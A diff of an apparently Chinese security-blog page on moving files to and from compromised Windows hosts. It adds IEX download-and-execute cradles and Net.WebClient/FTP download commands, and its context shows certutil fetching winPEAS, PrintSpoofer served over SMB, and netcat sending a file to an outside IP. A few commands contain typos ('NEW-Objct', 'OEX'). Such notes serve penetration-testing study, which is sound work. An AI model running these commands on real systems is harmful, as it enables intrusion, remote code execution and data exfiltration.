@@ -48,7 +48,7 @@
 ┌──(kali㉿kali)-[~/Work] └─$ ls -liah PrintSpoofer64.exe 2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe ┌──(kali㉿kali)-[~/Work] └─$ sudo impacket-smbserver Enil . -smb2support [sudo] password for kali: Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed impacket-smbserver 必须添加参数 -smb2support 参数，即启用 SMB2 协议支持。">
   <meta itemprop="datePublished" content="2026-02-27T17:00:00+08:00">
   <meta itemprop="dateModified" content="2026-02-27T17:00:00+08:00">
-  <meta itemprop="wordCount" content="213">
+  <meta itemprop="wordCount" content="261">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -142,9 +142,6 @@
     <li><a href="#windows">Windows</a>
       <ul>
         <li><a href="#传入文件">传入文件</a></li>
-        <li><a href="#certutil">Certutil</a></li>
-        <li><a href="#impacket-smbserver">Impacket-smbserver</a></li>
-        <li><a href="#invoke-webrequest">Invoke-WebRequest</a></li>
         <li><a href="#传出文件">传出文件</a></li>
       </ul>
     </li>
@@ -166,7 +163,7 @@
 </span></span><span style="display:flex;"><span>└─$ scp -P <span style="color:#ae81ff">10110</span> -q erso@10.110.10.45:/bin/dartVader .
 </span></span></code></pre></div><h2 id="windows">Windows</h2>
 <h3 id="传入文件">传入文件</h3>
-<h3 id="certutil">Certutil</h3>
+<h4 id="certutil">Certutil</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; certutil.exe -urlcache -split -f <span style="color:#e6db74">&#34;http://10.10.16.155:8000/winPEASx64.exe&#34;</span> .
 </span></span><span style="display:flex;"><span>****  Online  ****
 </span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">000000</span>  ...
@@ -174,7 +171,7 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
-</span></span></code></pre></div><h3 id="impacket-smbserver">Impacket-smbserver</h3>
+</span></span></code></pre></div><h4 id="impacket-smbserver">Impacket-smbserver</h4>
 <p>在要共享的文件夹下创建共享目录。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah PrintSpoofer64.exe 
@@ -208,8 +205,22 @@
 </span></span><span style="display:flex;"><span>03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
 </span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         27,136 bytes
 </span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   4,617,351,168 bytes free
-</span></span></code></pre></div><h3 id="invoke-webrequest">Invoke-WebRequest</h3>
+</span></span></code></pre></div><h4 id="invoke-webrequest">Invoke-WebRequest</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#39;http://10.10.16.58/nc.exe&#39;</span> -OutFile <span style="color:#e6db74">&#39;C:\Utils\nc.exe&#39;</span>
+</span></span></code></pre></div><h4 id="netwebclient">Net.WebClient</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&lt;URL&gt;&#39;</span>,<span style="color:#e6db74">&#39;Output File Name&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadFileAsync<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&lt;URL&gt;&#39;</span>,<span style="color:#e6db74">&#39;Output File Name&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="iex">IEX</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>IEX<span style="color:#f92672">(</span>NEW-Objct Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&lt;URL&gt;&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>NEW-Objct Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&lt;URL&gt;&#39;</span><span style="color:#f92672">)</span> | IEX
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#39;http://10.10.16.58/nc.exe&#39;</span> -OutFile <span style="color:#e6db74">&#39;C:\Utils\nc.exe&#39;</span> -UseBasicParsing | OEX
+</span></span></code></pre></div><h4 id="ftp-下载">FTP 下载</h4>
+<p>需要 Python3 的模块 <code>pyftpdlib</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo pip3 install pyftpdlib
+</span></span></code></pre></div><p>搭建 FTP 服务器。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 -m pyftpdlib --port <span style="color:#ae81ff">21</span>
+</span></span></code></pre></div><p>在 Windows 中下载文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ftp://10.10.16.58/test.txt&#39;</span>,<span style="color:#e6db74">&#39;C:\programdata\apps\test.txt&#39;</span><span style="color:#f92672">)</span>
 </span></span></code></pre></div><h3 id="传出文件">传出文件</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>download
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>tils&gt; cmd /c <span style="color:#e6db74">&#34;C:\Utils\nc64.exe 10.10.16.58 408 &lt; C:\Utils\out.txt&#34;</span>
